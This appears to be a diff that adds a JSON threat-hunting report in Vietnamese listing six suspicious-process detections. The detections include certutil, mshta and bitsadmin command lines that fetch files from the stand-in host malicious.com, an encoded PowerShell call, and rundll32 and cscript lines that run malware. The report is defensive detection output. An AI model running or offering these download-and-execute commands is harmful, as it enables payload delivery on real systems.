@@ -1,0 +1,99 @@
+{
+  "timestamp": "2026-09-05T19:33:20.013413",
+  "hunting_type": "Suspicious Processes",
+  "question": "Có quy trình bất thường nào đang chạy không?",
+  "total_detections": 6,
+  "by_severity": {
+    "HIGH": 4,
+    "MEDIUM": 2
+  },
+  "by_category": {
+    "PowerShell Encoded": 1,
+    "CertUtil Suspicious": 1,
+    "Mshta Suspicious": 1,
+    "rundll32 Suspicious": 1,
+    "Script Engines": 1,
+    "Living Off The Land": 1
+  },
+  "impact_assessment": "HIGH: Phát hiện multiple suspicious processes",
+  "indicators": [
+    {
+      "type": "Suspicious Process Detection",
+      "process": "PowerShell.exe",
+      "command_line": "powershell.exe -enc JABjAG8A...",
+      "category": "PowerShell Encoded",
+      "severity": "HIGH",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "PowerShell với encoded command - thường dùng cho obfuscation",
+      "impact": "Thực thi code ẩn",
+      "recommendation": "Điều tra process PowerShell.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    },
+    {
+      "type": "Suspicious Process Detection",
+      "process": "certutil.exe",
+      "command_line": "certutil.exe -urlcache -f http://malicious.com/file.exe",
+      "category": "CertUtil Suspicious",
+      "severity": "HIGH",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "CertUtil dùng cho tải file hoặc decode",
+      "impact": "Tải malware hoặc decode shellcode",
+      "recommendation": "Điều tra process certutil.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    },
+    {
+      "type": "Suspicious Process Detection",
+      "process": "mshta.exe",
+      "command_line": "mshta.exe http://malicious.com/payload.hta",
+      "category": "Mshta Suspicious",
+      "severity": "HIGH",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "mshta dùng để execute HTML Application",
+      "impact": "Thực thi script ẩn",
+      "recommendation": "Điều tra process mshta.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    },
+    {
+      "type": "Suspicious Process Detection",
+      "process": "rundll32.exe",
+      "command_line": "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\temp\\malware.exe",
+      "category": "rundll32 Suspicious",
+      "severity": "MEDIUM",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "rundll32 có thể dùng cho DLL injection",
+      "impact": "Thực thi arbitrary code",
+      "recommendation": "Điều tra process rundll32.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    },
+    {
+      "type": "Suspicious Process Detection",
+      "process": "cscript.exe",
+      "command_line": "cscript.exe //b //nologo malicious.vbs",
+      "category": "Script Engines",
+      "severity": "MEDIUM",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "Script engines có thể chạy malicious scripts",
+      "impact": "Thực thi VBScript hoặc JScript",
+      "recommendation": "Điều tra process cscript.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    },
+    {
+      "type": "Suspicious Process Detection",
+      "process": "bitsadmin.exe",
+      "command_line": "bitsadmin.exe /transfer job /download /resume http://malicious.com/file.exe",
+      "category": "Living Off The Land",
+      "severity": "HIGH",
+      "timestamp": "2026-09-05T19:33:20.013413",
+      "description": "Living off the land binary - dùng để bypass AV",
+      "impact": "Bypass control mechanisms",
+      "recommendation": "Điều tra process bitsadmin.exe, cân nhắc terminate nếu xác nhận malicious",
+      "detection_method": "Process command-line pattern matching",
+      "status": "DETECTED"
+    }
+  ]
+}
